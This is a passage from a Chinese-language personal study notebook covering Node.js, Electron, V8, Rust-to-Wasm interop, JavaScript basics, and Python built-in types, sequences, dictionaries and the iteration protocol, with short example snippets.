<li><code>version</code> indicates the current version</li>
<li><code>name</code> sets the application/package name</li>
<li><code>description</code> is a brief description of the app/package</li>
<li><code>main</code> set the entry point for the application</li>
<li><code>private</code> if set to <code>true</code> prevents the app/package to be accidentally published on <code>npm</code></li>
<li><code>scripts</code> defines a set of node scripts you can run</li>
<li><code>dependencies</code> sets a list of <code>npm</code> packages installed as dependencies</li>
<li><code>devDependencies</code> sets a list of <code>npm</code> packages installed as development dependencies</li>
<li><code>engines</code> sets which versions of Node.js this package/app works on</li>
<li><code>browserslist</code> is used to tell which browsers (and their versions) you want to support</li>
</ul>
</li>
</ul>
</blockquote>
<blockquote>
<p>A Node.js app runs in a single process, without creating a new thread for every request. Node.js provides a set of asynchronous I/O primitives in its standard library that prevent JavaScript code from blocking and generally, libraries in Node.js are written using non-blocking paradigms, making blocking behavior the exception rather than the norm.</p>
<p>When Node.js performs an I/O operation, like reading from the network, accessing a database or the filesystem, instead of blocking the thread and wasting CPU cycles waiting, Node.js will resume the operations when the response comes back.</p>
</blockquote>
<p>Nodejs是单进程的。但是提供了异步IO。</p>
<p>require: 给我的感觉有点像<code>import</code>，从外部导入一些东西。有些东西是不需要require的（感觉就像内置的一样），比如下面的<code>process</code></p>
<h4 id="process"><a class="header" href="#process">process</a></h4>
<blockquote>
<p>Note: <code>process</code> does not require a &quot;require&quot;, it's automatically available.</p>
</blockquote>
<p><code>process</code>: The <code>process</code> core module of Node.js provides the <code>env</code> property which hosts all the environment variables that were set at the moment the process was started.</p>
<h4 id="console"><a class="header" href="#console">console</a></h4>
<p><code>console.log()</code>可以向<code>stdout</code>输出内容，<code>console.error()</code>可以向<code>stderr</code>输出内容。还有利用控制字符添加颜色的<code>chalk</code>库。</p>
<pre><code class="language-js">const chalk = require('chalk')
console.log(chalk.yellow('hi!'))
</code></pre>
<h4 id="一些有用的包"><a class="header" href="#一些有用的包">一些有用的包</a></h4>
<p><a href="https://nodejs.org/api/readline.html">readline</a></p>
<pre><code class="language-js">const readline = require('readline').createInterface({  input: process.stdin,  output: process.stdout})
readline.question(`What's your name?`, name =&gt; {  console.log(`Hi ${name}!`)  readline.close()})
</code></pre>
<h3 id="chromium"><a class="header" href="#chromium">Chromium</a></h3>
<blockquote>
<p>V8 JavaScript Engine is the thing that takes our JavaScript and executes it while browsing with Chrome. V8 provides the runtime environment in which JavaScript executes. The DOM, and the other Web Platform APIs are provided by the browser.</p>
<p>The Node.js ecosystem is huge and thanks to V8 which also powers desktop apps, with projects like <strong>Electron</strong>.</p>
</blockquote>
<p>V8引擎是Chrome浏览器使用的，可以执行JS代码。但是他又是独立于浏览器的，所以我们可以利用它构建其他应用，比如桌面应用，Electron。</p>
<blockquote>
<p>JavaScript is generally considered an interpreted language, but modern JavaScript engines no longer just interpret JavaScript, they compile it. JavaScript is internally compiled by V8 with <strong>just-in-time</strong> (JIT) <strong>compilation</strong> to speed up the execution..</p>
</blockquote>
<h3 id="electron-1"><a class="header" href="#electron-1">Electron</a></h3>
<blockquote>
<p>每个 Electron 应用都有一个单一的主进程，作为应用程序的入口点。 <strong>主进程</strong>在 Node.js 环境中运行，这意味着它具有 <code>require</code> 模块和使用所有 Node.js API 的能力。</p>
<p>主进程的主要目的是使用 <a href="https://www.electronjs.org/docs/api/browser-window"><code>BrowserWindow</code></a> 模块创建和管理应用程序窗口。<code>BrowserWindow</code> 类的每个实例创建一个应用程序窗口，且在单独的渲染器进程中加载一个网页。 您可从主进程用 window 的 <a href="https://www.electronjs.org/docs/api/web-contents"><code>webContent</code></a> 对象与网页内容进行交互。</p>
<p>主进程还能通过 Electron 的 <a href="https://www.electronjs.org/docs/api/app"><code>app</code></a> 模块来控制您应用程序的生命周期。 该模块提供了一整套的事件和方法，可以使你添加自定义的应用程序行为 ( 例如：以编程方式退出您的应用程序、修改程序坞或显示关于面板 ) 。</p>
</blockquote>
<blockquote>
<p>预加载（preload）脚本包含了那些执行于<strong>渲染器进程</strong>中，且先于网页内容开始加载的代码 。 These scripts run within the renderer context, but are granted more privileges by having access to Node.js APIs.</p>
</blockquote>
<p><strong>什么是主进程</strong></p>
<ul>
<li>electron项目启动的时候运行main.js的进程就是主进程</li>
<li>一个项目有且只有一个主进程</li>
<li>创建窗口等所有系统事件都要在主进程中进行. 简单的说就是我们的electron项目的主进程只有一个, 主进程的执行代码需要写到main.js中, 所有跟系统事件相关的代码统统都要写在这里. </li>
<li>主进程通过BrowserWindow创建页面. 每个BrowserWindow实例都在自己的渲染进程中运行, 当BrowserWindow实例被销毁后, 相应的渲染进程也会被终止</li>
</ul>
<p><strong>什么是渲染进程</strong></p>
<ul>
<li>我们每创建一个web页面都会创建一个渲染进程</li>
<li>每个web页面运行在它自己的渲染进程中</li>
<li>每个渲染进程是独立的, 它只关心它所运行的页面. 简单理解就是一个web页面一个渲染进程.</li>
<li>渲染进程无法使用node</li>
</ul>
<p><strong>主进程和渲染进程之间如何通信</strong></p>
<p>我看解决方法大部分提到ipc.用sender和receiver完成通信. 但是渲染进程不能使用node提供的接口,我们需要封装一层.参考https://stackoverflow.com/questions/44391448/electron-require-is-not-defined/59888788#59888788</p>
<h3 id="wasm"><a class="header" href="#wasm">Wasm</a></h3>
<blockquote>
<p>WebAssembly是一种新的编码方式，可以在现代的网络浏览器中运行 － 它是一种低级的类汇编语言，具有紧凑的二进制格式，可以接近原生的性能运行，并为诸如C / C ++等语言提供一个编译目标，以便它们可以在Web上运行。它也被设计为可以与JavaScript共存，允许两者一起工作。而且，你在不知道如何编写WebAssembly代码的情况下就可以使用它。WebAssembly的模块可以被导入的到一个网络app（或Node.js）中，并且暴露出供JavaScript使用的WebAssembly函数。JavaScript框架不但可以使用WebAssembly获得巨大性能优势和新特性，而且还能使得各种功能保持对网络开发者的易用性。</p>
</blockquote>
<p><strong>在 Rust 中调用来自 JavaScript 的外部函数:</strong></p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>#[wasm_bindgen]
extern {
    pub fn alert(s: &amp;str);
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>编写能够在JavaScript中调用的 Rust 函数:</strong></p>
<p>最后一部分是这样的：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>#[wasm_bindgen]
pub fn greet(name: &amp;str) {
    alert(&amp;format!(&quot;Hello, {}!&quot;, name));
}
<span class="boring">}
</span></code></pre></pre>
<p>我觉得调用都好说,但是返回值是怎么处理的.两边用着不一样的类型系统.</p>
<blockquote>
<p>JavaScript's garbage-collected heap — where <code>Object</code>s, <code>Array</code>s, and DOM nodes are allocated — is distinct from WebAssembly's linear memory space, where our Rust values live. WebAssembly currently has no direct access to the garbage-collected heap (as of April 2018, this is expected to change with the <a href="https://github.com/WebAssembly/interface-types/blob/master/proposals/interface-types/Explainer.md">&quot;Interface Types&quot; proposal</a>). JavaScript, on the other hand, can read and write to the WebAssembly linear memory space, but only as an <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/ArrayBuffer"><code>ArrayBuffer</code></a> of scalar values (<code>u8</code>, <code>i32</code>, <code>f64</code>, etc...). WebAssembly functions also take and return scalar values. These are the building blocks from which all WebAssembly and JavaScript communication is constituted.</p>
<p><code>wasm_bindgen</code> defines a common understanding of how to work with compound structures across this boundary. It involves boxing Rust structures, and wrapping the pointer in a JavaScript class for usability, or indexing into a table of JavaScript objects from Rust. <code>wasm_bindgen</code> is very convenient, but it does not remove the need to consider our data representation, and what values and structures are passed across this boundary. Instead, think of it as a tool for implementing the interface design you choose.</p>
<p>When designing an interface between WebAssembly and JavaScript, we want to optimize for the following properties:</p>
<ol>
<li><strong>Minimizing copying into and out of the WebAssembly linear memory.</strong> Unnecessary copies impose unnecessary overhead.</li>
<li><strong>Minimizing serializing and deserializing.</strong> Similar to copies, serializing and deserializing also imposes overhead, and often imposes copying as well. If we can pass opaque handles to a data structure — instead of serializing it on one side, copying it into some known location in the WebAssembly linear memory, and deserializing on the other side — we can often reduce a lot of overhead. <code>wasm_bindgen</code> helps us define and work with opaque handles to JavaScript <code>Object</code>s or boxed Rust structures.</li>
</ol>
<p>As a general rule of thumb, a good JavaScript↔WebAssembly interface design is often one where large, long-lived data structures are implemented as Rust types that live in the WebAssembly linear memory, and are exposed to JavaScript as opaque handles. JavaScript calls exported WebAssembly functions that take these opaque handles, transform their data, perform heavy computations, query the data, and ultimately return a small, copy-able result. By only returning the small result of the computation, we avoid copying and/or serializing everything back and forth between the JavaScript garbage-collected heap and the WebAssembly linear memory.</p>
</blockquote>
<div style="break-before: page; page-break-before: always;"></div><h1 id="javascript简介"><a class="header" href="#javascript简介">JavaScript简介</a></h1>
<h2 id="基础"><a class="header" href="#基础">基础</a></h2>
<h3 id="数据类型"><a class="header" href="#数据类型">数据类型</a></h3>
<p><strong>值类型(基本类型)</strong>：字符串（String）、数字(Number)、布尔(Boolean)、对空（Null）、未定义（Undefined）、Symbol。</p>
<p><strong>引用数据类型</strong>：对象(Object)、数组(Array)、函数(Function)。</p>
<p>注：Symbol 是 ES6 引入了一种新的原始数据类型，表示独一无二的值。*</p>
<h3 id="函数-3"><a class="header" href="#函数-3">函数</a></h3>
<p>函数的定义</p>
<pre><code class="language-js">function myFunction() {
	alert(&quot;It's a function&quot;)
}
var aFunction = function() {
    alert(&quot;It's also a function&quot;)
}
</code></pre>
<p>变量的作用域：</p>
<ul>
<li>函数作用域和全局作用域。</li>
<li>凡是用var声明了的变量，无论在声明前后这个变量都是存在的。所有变量的初始值都是undefined。</li>
</ul>
<p>函数的参数：</p>
<p>所有的参数其实都可以通过<code>arguments</code>数组访问到。</p>
<p>闭包：我们还可以把函数作为值返回</p>
<pre><code class="language-js">function test(){
	var a = 0;
    return function() {
        console.log(a);
    }
}	
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="runtime-1"><a class="header" href="#runtime-1">Runtime</a></h1>
<h2 id="deno"><a class="header" href="#deno"><a href="https://deno.land/">Deno</a></a></h2>
<div style="break-before: page; page-break-before: always;"></div><h1 id="python"><a class="header" href="#python">Python</a></h1>
<p>在这一章里，会更注重Python本身底层的实现，和一些“黑魔法”，而不是如何去介绍包的一些API。了解底层实现可以帮助你写出更好的代码。</p>
<p>也可以认为是《Python学习手册》的读书笔记。也会参考标准库、源代码和其他一些资料。这本书这并不是面向0基础的，这里的笔记也是。</p>
<p>分成三个部分：</p>
<ol start="0">
<li>介绍Python的内置类型。类比于C语言，只有简单的<code>int</code>,<code>char</code>等基本类型，Python的内置类型可谓是丰富多彩。</li>
<li>介绍Python的工作原理。比如对象模型时怎么实现的，变量绑定的基本原理等，有助于你理解写出的Python代码。</li>
<li>介绍Python当中的一些高级写法。在编写小脚本的时候可能不会碰到，不过当要写一些完善的库的时候，可能会接触。</li>
</ol>
<p>这里探索了Python的一些原理，虽然还没有涉及到Python虚拟机、编译器的源代码，但是对于理解Python本身已经有了很大帮助。介绍了一些Python的黑魔法，然而我们不应该为了炫技而在代码中大量使用。</p>
<p>其实我并不喜欢Python的编程风格，因为他并不是静态类型的，也没有接口/特质，感觉用起来总是不那么顺手。</p>
<p>要怎么写出更好的Python代码呢？</p>
<ul>
<li><a href="https://pythonguidecn.readthedocs.io/zh/latest/index.html#id3">Python最佳实践</a></li>
<li><a href="https://github.com/vinta/awesome-python">awesome-python</a></li>
<li><a href="https://github.com/jobbole/awesome-python-cn">awesome-python-cn</a></li>
<li><a href="https://zh.wikipedia.org/wiki/Python%E4%B9%8B%E7%A6%85">Python之禅</a></li>
<li><a href="https://zh-google-styleguide.readthedocs.io/en/latest/google-python-styleguide/python_style_rules/#comments">Google Python风格指南</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="内置对象"><a class="header" href="#内置对象">内置对象</a></h1>
<p>Python中的内置类型是<strong>语言的组成部分</strong>。作为对比，Rust离开了<code>Vec</code>等也没有关系，它只是标准库的一部分。但是对于Python来说，像<code>list</code>,<code>dict</code>等都是语言的一部分，是密不可分的，内置类型一般不是用Python而是用C等其他语言优化实现的。主要内置类型有数字、序列、映射、类、实例和异常，所有的内置类型可以参考<a href="https://docs.python.org/zh-cn/3/library/stdtypes.html">标准库文档</a>。下面介绍其中的一些。</p>
<ul>
<li>数值类型: <code>int</code>, <code>float</code>, <code>complex</code>，都是不可变的。</li>
<li>序列类型: 可变的<code>list</code>，不可变的<code>tuple</code>, <code>range</code></li>
<li>文本序列: <code>str</code>，他是不可变的</li>
<li>字节序列: <code>bytes</code>，他是不可变的。对应有可变的<code>bytearray</code>。</li>
<li>集合: <code>set</code></li>
<li>字典: <code>dict</code></li>
<li>还有很多，比如<strong>上下文管理器类型</strong>，<strong>迭代器类型</strong>，类型注解类型，模块类型，函数类型，方法类型，代码对象类型，布尔值类型。</li>
</ul>
<p>Python中的每个对象都可以归类为<strong>可变和不可变</strong>的。在内置类型中，数字、字符串、元组是不可变的，列表、字典、集合是可变的。</p>
<hr />
<p><a href="https://www.honeybadger.io/blog/python-instantiation-metaclass/">metaclass的一篇文章</a></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="字符串和字节串"><a class="header" href="#字符串和字节串">字符串和字节串</a></h1>
<h2 id="str"><a class="header" href="#str"><a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#str"><code>str</code></a></a></h2>
<p>Python中的字符串是由 <strong>Unicode 码位</strong>构成的<strong>不可变</strong><a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#typesseq">序列</a>。</p>
<p>复习一下什么是不可变。在这里，<strong>不可变</strong>的意思是，对字符串的操作都不是对原始字符串进行改变，而是新生成一个字符串。你永远不可能通过对其任意位置进行赋值而改变字符串的值。不过你可以通过重新赋值的方法做到一样的效果，比如下面的代码，原来的“114514”在<code>a</code>不指向他之后被<strong>垃圾回收</strong>。</p>
<pre><code class="language-python">&gt;&gt;&gt; a.replace(&quot;1&quot;,&quot;&quot;)
'454'
&gt;&gt;&gt; a
'114514'
&gt;&gt;&gt; a = a.replace(&quot;1&quot;,&quot;&quot;)
&gt;&gt;&gt; a
'454'
</code></pre>
<p>字符串提供的API大致分成两类，一类是字符串作为序列拥有的API，一类是字符串特有的API，比如大小写转换，分词，格式化等。这里不作列举。</p>
<p>另外值得一提的还有</p>
<ol>
<li>字符串提供了很多的内置方法，不过你也许还需要正则表达式<code>re</code>库的帮助。</li>
<li>如果你需要可变的字符串，可以用<code>bytearray</code>或者<code>io.StringIO</code>。</li>
</ol>
<h2 id="bytes-和-bytearray"><a class="header" href="#bytes-和-bytearray"><a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#bytes"><code>bytes</code></a> 和 <a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#bytearray"><code>bytearray</code></a></a></h2>
<p>bytes 对象是由单个字节构成的不可变序列。bytearray 对象是 bytes 对象的可变对应物。</p>
<p>因为他们也都是序列，所以也支持序列的操作。我们也经常用bytes来表示仅有ASCII字符构成的字符串，所以bytes也支持<u>大部分</u>字符串的操作。</p>
<p>另外值得一提的还有</p>
<ol>
<li><code>bytes</code>和<code>str</code>之间，通过<code>bytes.decode</code>和<code>str.encode</code>进行相互转换。</li>
<li>它们由 <a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#memoryview"><code>memoryview</code></a> 提供支持，该对象使用 <a href="https://docs.python.org/zh-cn/3/c-api/buffer.html#bufferobjects">缓冲区协议</a> 来访问其他二进制对象所在内存，不需要创建对象的副本。</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h1 id="数值"><a class="header" href="#数值">数值</a></h1>
<p>数值包括 <a href="https://docs.python.org/zh-cn/3/library/functions.html#int"><code>int</code></a>, <a href="https://docs.python.org/zh-cn/3/library/functions.html#float"><code>float</code></a>, <a href="https://docs.python.org/zh-cn/3/library/functions.html#complex"><code>complex</code></a>。整数具有<strong>无限的精度</strong>。 浮点数通常使用 C 中的 double 来实现。</p>
<p>值得一提的是整数和字符串/字节串之间的转换，因为当我们和外部进行交互的时候，经常需要将他们进行互相转换。</p>
<pre><code class="language-python"># 整数 =&gt; 字符串
&gt;&gt;&gt; hex(10)
'0xa'
&gt;&gt;&gt; oct(10)
'0o12'
&gt;&gt;&gt; bin(10)
'0b1010'
&gt;&gt;&gt; f&quot;{10:x}&quot;   # 更通用的方式是格式化字符串
'a'
# 字符串 =&gt; 整数
&gt;&gt;&gt; int(&quot;12&quot;)
12

# 整数 =&gt; 字节串
&gt;&gt;&gt; (12).to_bytes(8,&quot;little&quot;) 
b'\x0c\x00\x00\x00\x00\x00\x00\x00'
# 字节串 =&gt; 整数
&gt;&gt;&gt; int.from_bytes(b&quot;\xff\xff&quot;, &quot;little&quot;)
65535
</code></pre>
<p>另外值得一提的就是Python针对整数的一些函数，不过这些都比较简单，你猜也能猜个大概，这里不提了，可以看文档。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="序列"><a class="header" href="#序列">序列</a></h1>
<p><a href="https://docs.python.org/zh-cn/3/library/collections.abc.html#collections.abc.Sequence"><code>collections.abc.Sequence</code></a> 用来描述序列的通用操作需要的接口，实现了接口，就可以进行下面的操作</p>
<div class="table-wrapper"><table><thead><tr><th>序列通用操作</th><th>说明</th></tr></thead><tbody>
<tr><td><code>x in s</code></td><td>如果 <em>s</em> 中的某项等于 <em>x</em> 则结果为 <code>True</code>，否则为 <code>False</code></td></tr>
<tr><td><code>x not in s</code></td><td>如果 <em>s</em> 中的某项等于 <em>x</em> 则结果为 <code>False</code>，否则为 <code>True</code></td></tr>
<tr><td><code>s + t</code></td><td><em>s</em> 与 <em>t</em> 相拼接</td></tr>
<tr><td><code>s * n</code> 或 <code>n * s</code></td><td>相当于 <em>s</em> 与自身进行 <em>n</em> 次拼接</td></tr>
<tr><td><code>s[i]</code></td><td><em>s</em> 的第 <em>i</em> 项，起始为 0</td></tr>
<tr><td><code>s[i:j]</code></td><td><em>s</em> 从 <em>i</em> 到 <em>j</em> 的切片</td></tr>
<tr><td><code>s[i:j:k]</code></td><td><em>s</em> 从 <em>i</em> 到 <em>j</em> 步长为 <em>k</em> 的切片</td></tr>
<tr><td><code>len(s)</code></td><td><em>s</em> 的长度</td></tr>
<tr><td><code>min(s)</code></td><td><em>s</em> 的最小项 13</td></tr>
</tbody></table>
</div>
<p><a href="https://docs.python.org/zh-cn/3/library/collections.abc.html#collections.abc.MutableSequence"><code>collections.abc.MutableSequence</code></a> 描述了可变序列的通用操作需要的接口，实现了接口，就可以进行下面的操作</p>
<div class="table-wrapper"><table><thead><tr><th style="text-align: left">可变序列通用操作</th><th style="text-align: left">说明</th></tr></thead><tbody>
<tr><td style="text-align: left"><code>s[i] = x</code></td><td style="text-align: left">将 <em>s</em> 的第 <em>i</em> 项替换为 <em>x</em></td></tr>
<tr><td style="text-align: left"><code>s[i:j] = t</code></td><td style="text-align: left">将 <em>s</em> 从 <em>i</em> 到 <em>j</em> 的切片替换为可迭代对象 <em>t</em> 的内容</td></tr>
<tr><td style="text-align: left"><code>del s[i:j]</code></td><td style="text-align: left">等同于 <code>s[i:j] = []</code></td></tr>
<tr><td style="text-align: left"><code>s[i:j:k] = t</code></td><td style="text-align: left">将 <code>s[i:j:k]</code> 的元素替换为 <em>t</em> 的元素</td></tr>
<tr><td style="text-align: left"><code>del s[i:j:k]</code></td><td style="text-align: left">从列表中移除 <code>s[i:j:k]</code> 的元素</td></tr>
<tr><td style="text-align: left"><code>s.append(x)</code></td><td style="text-align: left">将 <em>x</em> 添加到序列的末尾 (等同于 <code>s[len(s):len(s)] = [x]</code>)</td></tr>
<tr><td style="text-align: left"><code>s.clear()</code></td><td style="text-align: left">从 <em>s</em> 中移除所有项 (等同于 <code>del s[:]</code>)</td></tr>
<tr><td style="text-align: left"><code>s.copy()</code></td><td style="text-align: left">创建 <em>s</em> 的浅拷贝 (等同于 <code>s[:]</code>)</td></tr>
<tr><td style="text-align: left"><code>s.extend(t)</code> 或 <code>s += t</code></td><td style="text-align: left">用 <em>t</em> 的内容扩展 <em>s</em> (基本上等同于 <code>s[len(s):len(s)] = t</code>)</td></tr>
<tr><td style="text-align: left"><code>s *= n</code></td><td style="text-align: left">使用 <em>s</em> 的内容重复 <em>n</em> 次来对其进行更新</td></tr>
<tr><td style="text-align: left"><code>s.insert(i, x)</code></td><td style="text-align: left">在由 <em>i</em> 给出的索引位置将 <em>x</em> 插入 <em>s</em> (等同于 <code>s[i:i] = [x]</code>)</td></tr>
<tr><td style="text-align: left"><code>s.pop()</code> 或 <code>s.pop(i)</code></td><td style="text-align: left">提取在 <em>i</em> 位置上的项，并将其从 <em>s</em> 中移除</td></tr>
<tr><td style="text-align: left"><code>s.remove(x)</code></td><td style="text-align: left">删除 <em>s</em> 中第一个 <code>s[i]</code> 等于 <em>x</em> 的项目。</td></tr>
<tr><td style="text-align: left"><code>s.reverse()</code></td><td style="text-align: left">就地将列表中的元素逆序。</td></tr>
</tbody></table>
</div>
<h2 id="list-1"><a class="header" href="#list-1">list</a></h2>
<pre><code class="language-python">&gt;&gt;&gt; l = [12,&quot;12&quot;,12.0]
</code></pre>
<blockquote>
<p>Python中的序列和其他语言中的数组（或者用<code>Vec</code>更恰当）最大的不同在于他里面的元素不需要是同一类型的。这个也好理解，Python中的这些元素都是一个指向真正内容的“指针”，设计成一样的大小很容易。</p>
</blockquote>
<p>列表是<strong>可变</strong>的<strong>序列</strong>，他支持上面提到的通用序列和可变序列的操作。</p>
<p>另外还值得一提的是：</p>
<ol>
<li>
<p><code>sort</code>方法可以进行排序。</p>
</li>
<li>
<p>当你写出<code>[[]] * 10</code>创建二维数组的时候，实际上创建了10个指向同一个位置的list。</p>
<pre><code class="language-python">&gt;&gt;&gt; a = [[]] * 10
&gt;&gt;&gt; a
[[], [], [], [], [], [], [], [], [], []]
&gt;&gt;&gt; a[0].append(10)
&gt;&gt;&gt; a
[[10], [10], [10], [10], [10], [10], [10], [10], [10], [10]]
</code></pre>
</li>
</ol>
<h2 id="tuple"><a class="header" href="#tuple">tuple</a></h2>
<pre><code class="language-python">&gt;&gt;&gt; t = (12,&quot;12&quot;,12.0) 
</code></pre>
<p>元组是不可变的序列，他支持上面提到的通用序列操作。</p>
<p>另外还值得一提的是</p>
<ol>
<li>
<p>我们会在Python中写出<code>a,b,c,d = 1,2,3,4</code>这样的语句，进行模式匹配风格的赋值。其实他的意思是<code>a,b,c,d = (1,2,3,4)</code>，先生成了元组<code>(1,2,3,4)</code>，然后迭代绑定给<code>a,b,c,d</code>。</p>
<pre><code class="language-python">&gt;&gt;&gt; def func():
...     a,b,c,d = 1,2,3,4
...
&gt;&gt;&gt; dis.dis(func)
  2           0 LOAD_CONST               1 ((1, 2, 3, 4))
              2 UNPACK_SEQUENCE          4
              4 STORE_FAST               0 (a)
              6 STORE_FAST               1 (b)
              8 STORE_FAST               2 (c)
             10 STORE_FAST               3 (d)
             12 LOAD_CONST               0 (None)
             14 RETURN_VALUE
</code></pre>
</li>
<li>
<p>定义只有一个元素的元组，用<code>(1,)</code>，否则<code>()</code>会被当成运算符处理。</p>
</li>
</ol>
<h2 id="range"><a class="header" href="#range">range</a></h2>
<p>range 类型表示不可变的数字序列，通常用于在 for 循环中循环指定的次数。这个很常用，也很简单。</p>
<p>Python中的</p>
<pre><code class="language-python">for i in range(start, end, step):
	pass
</code></pre>
<p>和C语言中的</p>
<pre><code class="language-c">for (int i=start; i&lt;end; i+=step) {
	
}
</code></pre>
<p>是一个意思。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="映射-2"><a class="header" href="#映射-2">映射</a></h1>
<h2 id="dict"><a class="header" href="#dict">dict</a></h2>
<p>字典不是序列而是一种<strong>映射</strong>，他将key映射到相应的value上。</p>
<pre><code class="language-python">&gt;&gt;&gt; b = {'one': 1, 'two': 2, 'three': 3}
</code></pre>
<blockquote>
<p>Python中的dict也不要求key的类型都相同，value也是。要理解这一点，需要理解“鸭子类型”。只要hashtable的类型，都可以当作key</p>
</blockquote>
<p>介绍一些常用的API</p>
<pre><code class="language-python">d = {'URL': 'www.baidu.com', 'Code': 202}	
d['Body'] = '123'              #添加键值对
d.get(&quot;URL&quot;)                   #返回key对应的value，并且在key不存在时返回None
d.pop(&quot;URL&quot;,default=None)      #返回key对应的value，并删除key-value，在key不存在时返回default
#上面两个方法返回的都是视图对象view objects.该对象提供字典条目的一个动态视图。
</code></pre>
<p>值得一提的是</p>
<ol>
<li>
<p>要遍历key-value，应该用<code>items</code>。如果直接用字典本身，遍历的是key。另外，实现请不要依赖遍历的顺序。</p>
<pre><code class="language-python">&gt;&gt;&gt; for k,v in b.items():
...     k,v
... 
('one', 1)
('two', 2)
('three', 3)
</code></pre>
</li>
</ol>
<h2 id="set"><a class="header" href="#set">set</a></h2>
<pre><code class="language-python">&gt;&gt;&gt; s = {1,2,3}
</code></pre>
<p>可以认为集合就是只有键的字典。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="迭代器和生成器"><a class="header" href="#迭代器和生成器">迭代器和生成器</a></h1>
<h2 id="迭代协议"><a class="header" href="#迭代协议">迭代协议</a></h2>
<ul>
<li>可迭代对象：迭代的被调对象，其<code>__iter__</code>方法被<code>iter</code>函数调用。</li>
<li>迭代器对象：可迭代对象的返回结果，在迭代过程中实际提供值的对象。他的<code>__next__</code>方法被<code>next</code>调用，并在结束时除法<code>StopIteration</code>异常。</li>
</ul>
<p>Python的迭代协议被用于for循环、推导语法、映射等，得到文件、列表、字典和生成器的支持。一些对象既是可迭代对象，又是迭代器对象，他们会在<code>__iter__</code>方法中返回自己。</p>
<p>我们从一个简单的例子看Python的迭代实现。<code>count</code>就是一个可迭代对象，因为他实现了<code>__iter__</code>方法；同时他也是一个迭代器对象，因为他实现了<code>__next__</code>方法。</p>
<pre><code class="language-python">class Count():
    a = 0
    def __iter__(self):
        self.a = 0
        return self

    def __next__(self):
        self.a += 1
        if self.a&lt;10:
            return self.a
        else:
            raise StopIteration
            
c = Count()
for i in c:
    print(f&quot;count = {i}&quot;)
</code></pre>
<p>迭代器最常用的就是和for一起了，比如上面的代码。</p>
<ul>
<li>首先调用<code>c.__iter__</code>，得到一个<code>迭代器对象</code>，在这里就是他自己，记做<code>c_iter</code>。</li>
<li>然后不停的调用<code>c_iter.__next__</code>，<code>i</code>就是返回值的<strong>引用</strong>。</li>
<li>如果发生了<code>StopIteration</code>异常，捕获他，停止迭代；否则继续调用<code>c_iter.__next__</code>迭代。</li>
</ul>
<p>和下面的代码是一个意思，不过你当然要用上面的写法，他不仅简单，而且更有利于优化。</p>
<pre><code class="language-python">c_iter = c.__iter__()
while True:
    try:
        i = c_iter.__next__()
    except StopIteration:
        break
    print(f&quot;count = {i}&quot;)
</code></pre>
<h2 id="常见的可迭代对象"><a class="header" href="#常见的可迭代对象">常见的可迭代对象</a></h2>
<p>是不是感觉自己可以想象出来Python内置类型，比如list, dict的<code>__iter__</code>和<code>__next__</code>是怎么实现的了？不过有一个问题就是，不像C/Rust是<strong>自举</strong>的，Python的解释器是C写的（也有别的语言实现的版本），这些内置类型为了效率也是用C写的。</p>
<p>值得一提的是<code>file</code>对象实现的迭代协议。我们用下面的方法对文件的每一行（所以需要是文本文件）进行遍历，可以避免一次性加载文件全部内容<code>readlines</code>的对大文件不友好的行为。</p>
<pre><code class="language-python">with open(&quot;main.py&quot;) as f:
    # for line in f.readlines():
    for line in f:
        print(line,end=&quot;&quot;)
</code></pre>
<h2 id="推导"><a class="header" href="#推导">推导</a></h2>
<p>还是上面的文件的例子。</p>
<pre><code class="language-python">&gt;&gt;&gt; with open(&quot;d.txt&quot;) as f:
...     (line.strip() for line in f)
...     [line.strip() for line in f]
... 
&lt;generator object &lt;genexpr&gt; at 0x7f3dc9fd1b30&gt;
['a 1', 'b 2', 'c 3', '']
</code></pre>
<p>第一行是生成器推导，得到的是<strong>惰性的生成器</strong>。这个方法和Rust中的<code>map</code>方法感觉是如出一辙。如果你在其中加入<code>if</code>的话那<code>filter</code>就出来了。</p>
<p>第二行是列表推导，得到的是列表。</p>
<h2 id="对迭代器使用的方法"><a class="header" href="#对迭代器使用的方法">对迭代器使用的方法</a></h2>
<p>函数式风格的语法让我感觉不如Rust爽，不过Python的鸭子类型也确实这能如此了。</p>
<div class="table-wrapper"><table><thead><tr><th>函数名</th><th>例子</th><th>含义</th></tr></thead><tbody>
<tr><td><strong>map</strong></td><td>map(abs, (-1,0,1))</td><td>对迭代器的每一项执行某函数，还是返回迭代器</td></tr>
<tr><td><strong>filter</strong></td><td>map(lambda x:x&gt;0, (-1,0,1))</td><td>筛选迭代器的项，还是返回迭代器</td></tr>
<tr><td>enumerate</td><td></td><td></td></tr>
<tr><td><strong>reduce</strong></td><td>n3reduce(max,[1,2])</td><td>合并可迭代对象中的元素</td></tr>
<tr><td>zip</td><td></td><td></td></tr>
<tr><td>join</td><td>&gt;&gt;&gt; &quot;&amp;&amp;&quot;.join([‘1’, ‘2’])<br />'1&amp;&amp;2'</td><td></td></tr>
<tr><td>list</td><td>list(open(‘a.txt’))</td><td>把迭代器转换成list</td></tr>
<tr><td>tuple</td><td>tuple(open(‘a.txt’))</td><td>把迭代器转换成tuple</td></tr>
</tbody></table>
</div>
<p>下面的模式匹配赋值，in 成员测试，实际上<strong>都利用了迭代协议</strong>。也就是说，对于上面那个<code>Count</code>的例子，你也可以用模式匹配赋值和in成员测试。</p>
<p>最后的切片和索引也利用了迭代协议，不过光是迭代协议还是不够的。如果你对<code>Count</code>那个例子使用，会报错TypeError: 'Count' object is not subscriptable。这个之后再谈。</p>
<pre><code class="language-python">&gt;&gt;&gt; a,b,c = [1,2,3]
&gt;&gt;&gt; a,b,c
(1, 2, 3)
